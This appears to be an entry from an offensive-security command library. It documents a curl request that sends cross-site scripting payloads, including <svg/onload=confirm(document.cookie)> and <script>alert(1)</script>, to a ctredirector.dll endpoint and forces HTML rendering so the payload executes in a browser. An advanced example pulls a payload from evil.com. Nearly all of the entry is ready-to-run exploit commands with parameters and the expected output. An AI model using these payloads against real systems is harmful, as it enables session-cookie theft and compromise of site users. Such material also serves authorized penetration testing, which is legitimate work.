---
data: >-
  curl
  "http://target.com/scripts/ctredirector.dll?_FILE=http://google.com/<svg/onload=confirm(document.cookie)>&_TEXTDESCRIPTIONEN=1"
  -v
tags:
  - xss
  - content-type
  - curl
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:16:20.274Z'
id: 40ba17b4-07b5-41ca-8df9-ca5ca5953f6a
verified: false
validated: true
submitted: true
---
# curl-force-html-xss

## Command

```bash
curl "http://target.com/scripts/ctredirector.dll?_FILE=http://google.com/<svg/onload=confirm(document.cookie)>&_TEXTDESCRIPTIONEN=1" -v
```

## Description

This command sends a request combining the XSS payload in @_FILE with @_TEXTDESCRIPTIONEN to force text/html content type, enabling potential JS execution when rendered in a browser. Ideal for verifying full XSS chains.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `target.com` | Target hostname | Yes |
| `_FILE=...` | Payload parameter | Yes |
| `_TEXTDESCRIPTIONEN=1` | Forces HTML rendering | Yes |
| `-v` | Verbose output | No |

## Examples

### Basic Usage

```bash
curl "http://target.com/scripts/ctredirector.dll?_FILE=<script>alert(1)</script>&_TEXTDESCRIPTIONEN=1" -v
```

### Advanced Usage

```bash
curl "http://target.com/scripts/ctredirector.dll?_FILE=http://evil.com/payload.svg&_TEXTDESCRIPTIONEN=1" --output response.html -v
```

## Expected Output

Response headers include Content-Type: text/html, body echoes the payload unescaped. When saved and opened in a browser, JS executes (e.g., confirm dialog with cookies).

## Related

- [[Related Procedure|procedures/Force-HTML-Rendering-with-_TEXTDESCRIPTIONEN]]
